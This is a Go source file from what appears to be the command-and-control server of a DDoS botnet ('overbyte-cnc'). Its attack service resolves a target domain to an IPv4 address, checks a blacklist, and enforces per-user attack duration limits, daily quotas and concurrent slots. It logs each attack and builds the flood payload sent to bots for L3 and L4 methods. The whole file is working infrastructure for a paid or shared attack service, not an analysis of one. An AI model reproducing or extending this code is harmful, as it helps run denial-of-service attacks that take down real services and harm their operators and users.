package attack

import (
	"context"
	"fmt"
	"net"
	"strings"
	"time"

	"overbyte-cnc/bot"
	"overbyte-cnc/database"
)

type AttackResult struct {
	Payload    []byte
	AttackID   int64
	Warnings   []string
	TargetIP   string
	TargetPort int
	Duration   int
	Method     string
}

type Service struct {
	db             *database.Database
	maxGlobalSlots int
}

func NewService(db *database.Database, maxGlobalSlots int) *Service {
	return &Service{
		db:             db,
		maxGlobalSlots: maxGlobalSlots,
	}
}

func (s *Service) ValidateAndBuild(user *database.User, method, target string, port, duration int, options map[string]string) (*AttackResult, error) {
	method = strings.ToLower(method)
	if _, exists := bot.MethodMap[method]; !exists {
		return nil, fmt.Errorf("unknown method: %s", method)
	}

	isL3 := bot.IsL3Attack(method)
	if isL3 && port != 0 {
		return nil, fmt.Errorf("L3 attack (%s) does not use port - omit port parameter", method)
	}
	if !isL3 && (port < 1 || port > 65535) {
		return nil, fmt.Errorf("port required for L4 attack (1-65535)")
	}

	// Minimum duration validation
	if duration < 1 {
		return nil, fmt.Errorf("duration must be at least 1 second")
	}

	targetIP := target

	if net.ParseIP(target) == nil {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		resolver := net.Resolver{}
		ips, err := resolver.LookupIP(ctx, "ip4", target)
		if err != nil || len(ips) == 0 {
			return nil, fmt.Errorf("failed to resolve domain: %s", target)
		}
		for _, resolvedIP := range ips {
			if v4 := resolvedIP.To4(); v4 != nil {
				targetIP = v4.String()
				break
			}
		}
		if net.ParseIP(targetIP) == nil {
			return nil, fmt.Errorf("no IPv4 address found for domain")
		}
		if options == nil {
			options = make(map[string]string)
		}
		options["domain"] = target
	}

	// Check blacklist before proceeding
	isBlacklisted, err := s.db.IsIPBlacklisted(targetIP)
	if err != nil {
		return nil, fmt.Errorf("database error checking blacklist: %w", err)
	}
	if isBlacklisted {
		return nil, fmt.Errorf("target %s is blacklisted", targetIP)
	}

	if user.Role != "root" {
		if user.MaxTime > 0 && duration > user.MaxTime {
			return nil, fmt.Errorf("duration exceeds limit (%d seconds)", user.MaxTime)
		}
		if user.DailyLimit > 0 && user.DailyUsed >= user.DailyLimit {
			return nil, fmt.Errorf("daily attack limit reached")
		}
		if user.MaxSlots > 0 {
			running, err := s.db.GetUserRunningAttacks(user.ID)
			if err != nil {
				return nil, fmt.Errorf("database error: %w", err)
			}
			if running >= user.MaxSlots {
				return nil, fmt.Errorf("max concurrent attacks reached (%d)", user.MaxSlots)
			}
		}
	}

	globalSlots, err := s.db.GetGlobalSlotsInUse()
	if err != nil {
		return nil, fmt.Errorf("database error: %w", err)
	}
	if s.maxGlobalSlots > 0 && globalSlots >= s.maxGlobalSlots {
		return nil, fmt.Errorf("global attack limit reached")
	}

	attackID, err := s.db.LogAttack(user.ID, targetIP, port, duration, method)
	if err != nil {
		return nil, fmt.Errorf("database error: %w", err)
	}

	options, warnings := ValidateOptions(method, options)
	data, err := Build(method, targetIP, port, duration, options)
	if err != nil || data == nil {
		_ = s.db.UpdateAttackStatus(attackID, "stopped")
		return nil, fmt.Errorf("failed to build attack: %w", err)
	}

	return &AttackResult{
		Payload:    data,
		AttackID:   attackID,
		Warnings:   warnings,
		TargetIP:   targetIP,
		TargetPort: port,
		Duration:   duration,
		Method:     method,
	}, nil
}
